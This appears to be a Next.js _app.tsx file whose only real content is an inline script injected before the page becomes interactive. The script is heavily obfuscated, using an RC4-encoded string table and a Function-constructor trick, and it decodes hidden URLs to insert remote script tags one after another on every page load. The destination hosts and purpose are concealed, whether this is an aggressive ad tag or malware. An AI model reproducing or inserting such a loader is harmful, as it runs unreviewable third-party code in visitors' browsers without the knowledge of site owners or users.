import "../styles/globals.css";
import type { AppType } from "next/dist/shared/lib/utils";
import Script from "next/script";

const MyApp: AppType = ({ Component, pageProps }) => {
  return (
    <>
      <Script
        id="woo"
        type="text/javascript"
        data-cfasync="false"
        strategy="beforeInteractive"
        dangerouslySetInnerHTML={{
          __html: `/*<![CDATA[/* */
          (function(){if(window.c58bfa63bea075c5ba0d81f74e4fae88) return; window.c58bfa63bea075c5ba0d81f74e4fae88="EWYxyU70cTQl0Ygqf0gXW2nEQ4LPRZNJ3qrgQNyUXCAc4hjDrXrko_-T_k-Wei7D3hfkrQFddQSvGVDCcw";var a=['wo5uJz16PQ==','GsK0F8ODHlzCnQ94eEHDow==','w5RDw6LCuMKYJwLCoMOO','wr/DmGHDsQnCmg==','wqoWDiZxNnZrLcO4wo8=','w4dqLMK/woFHwrcnL8KAwpTCrQE=','OzXCoEJpbsOGw4g=','AsKsVmZsEyoVaMKqdDFIwoE=','OHwGYMOUKsOEAgfClD3DmsKbw6fCjlYvw5NwcBE5wo5fwooRw4Esw58J','wq/CgcKAwpnDiMOvwrY=','wpvDo08=','FMK/EMOjAE3Csg9wY0DDhMKDfMOSwpceTMOQwps=','KzpAK8OCOsKSAxPCmDbCnsOMw6jDj1hsw59qeBg5wpIfwpNWw4Fnw4FVDBpoS8OZwp3Cu8OCwo0g','w7rDjgHCn0cA','w6t2XkUzKcKmwq14SEEs','woHDmEbCqlA=','F8K/AsOHGUTCqzp7ZXfDp8KD','wqQNDxdrHQ==','BsOUYDTDkcOtw7jCvUnCgsKUwpvDh3Ez','w57DkRML','wo1mIT1dLQswwqzCrA==','GsOFbDDCjcK9wrbDpA==','DzDClcKww4Mww5LCug==','wpXCt8KHwpc=','worDs0TDtMObOwQ=','w7nDkcOIw47ClDhVw7Jfw5/Cuiw='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x18e));var b=function(c,d){c=c-0x0;var e=a[c];if(b['paKJea']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['qHcpZP']=g;b['LXcMsd']={};b['paKJea']=!![];}var f=b['LXcMsd'][c];if(f===undefined){if(b['CPRvjk']===undefined){b['CPRvjk']=!![];}e=b['qHcpZP'](e,d);b['LXcMsd'][c]=e;}else{e=f;}return e;};var x=window;x[b('0xf','4he3')]=[[b('0x12','%pFJ'),0x4b9ecc],[b('0x9','5yGJ'),0x0],[b('0x19','zC)F'),'0'],[b('0x6','7hPi'),0x0],[b('0x1','$gW1'),![]],[b('0x8','5X46'),0x0],[b('0x11','pCMX'),!0x0]];var g=[b('0x0','O!2J'),b('0x4','O!2J')],r=0x0,y,s=function(){if(!g[r])return;y=x[b('0x18','L&&x')][b('0x17','wO&0')](b('0x5','G77F'));y[b('0xb','0REv')]=b('0xa','*5l9');y[b('0x7','Q4B0')]=!0x0;var c=x[b('0xe','y)XZ')][b('0x3','5X46')](b('0x15','vHgV'))[0x0];y[b('0x2','@A8!')]=b('0xd','*5l9')+g[r];y[b('0x16','5yGJ')]=b('0x14','J&&z');y[b('0x10','Oe@Q')]=function(){r++;s();};c[b('0xc','%pFJ')][b('0x13','5X46')](y,c);};s();})();
          /*]]>/* */`
        }} />
      <Component {...pageProps} />
    </>
  );
};

export default MyApp;
